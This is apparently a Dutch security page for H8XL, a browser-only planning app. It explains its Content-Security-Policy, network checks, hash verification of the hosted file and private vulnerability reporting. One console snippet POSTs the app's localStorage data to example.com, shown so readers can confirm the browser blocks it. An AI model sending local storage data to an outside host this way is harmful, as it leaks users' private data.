# Beveiliging en zelf controleren

H8XL claimt dat je planning je browser niet verlaat. Je hoeft dat niet op ons woord te geloven. Hieronder staat hoe je het in een paar minuten zelf controleert.

## 1. Lees de beveiligingsregels

Bovenaan `index.html` staat een regel `<meta http-equiv="Content-Security-Policy" ...>`. De belangrijkste onderdelen:

- `connect-src 'none'`: de pagina mag met niemand verbinding maken om data uit te wisselen.
- `img-src data: blob:`: afbeeldingen mogen alleen uit de pagina zelf komen, zodat data niet via een externe afbeelding kan weglekken.
- `form-action 'none'`: formulieren kunnen nergens heen worden verstuurd.
- `script-src 'sha256-…'`: alleen precies dit script mag draaien. Verandert er één teken, dan weigert de browser het.

Deze regels worden door je browser afgedwongen, niet door H8XL.

## 2. Kijk mee in je browser

1. Open H8XL en daarna de ontwikkelaarstools (F12), tabblad **Network**.
2. Maak een planning, sleep wat, exporteer naar Excel en PDF.
3. Je ziet geen verzoeken met je planning. De enige externe verzoeken zijn het lettertype en, alleen bij oude .xls-bestanden, SheetJS (zie [PRIVACY.md](PRIVACY.md)).

## 3. Probeer zelf data te versturen

Plak in het tabblad **Console**:

```js
fetch("https://example.com", { method: "POST", body: localStorage.getItem("planbord.v1") })
```

De browser weigert dit met een melding over `connect-src 'none'`.

## 4. Controleer dat de website deze code draait

H8XL is één bestand zonder bouwstap. De gehoste versie hoort dus byte voor byte gelijk te zijn aan `index.html` in deze repository:

```sh
shasum -a 256 index.html
curl -s https://h8xl.app/ | shasum -a 256
```

Twee keer dezelfde uitkomst betekent dezelfde code.

## Een kwetsbaarheid melden

Vind je een manier waarop data toch weg kan lekken, of een ander beveiligingsprobleem? Meld het dan niet als openbare issue, maar mail naar `cid.rollocks@gmail.com`. Je krijgt binnen een paar werkdagen antwoord.
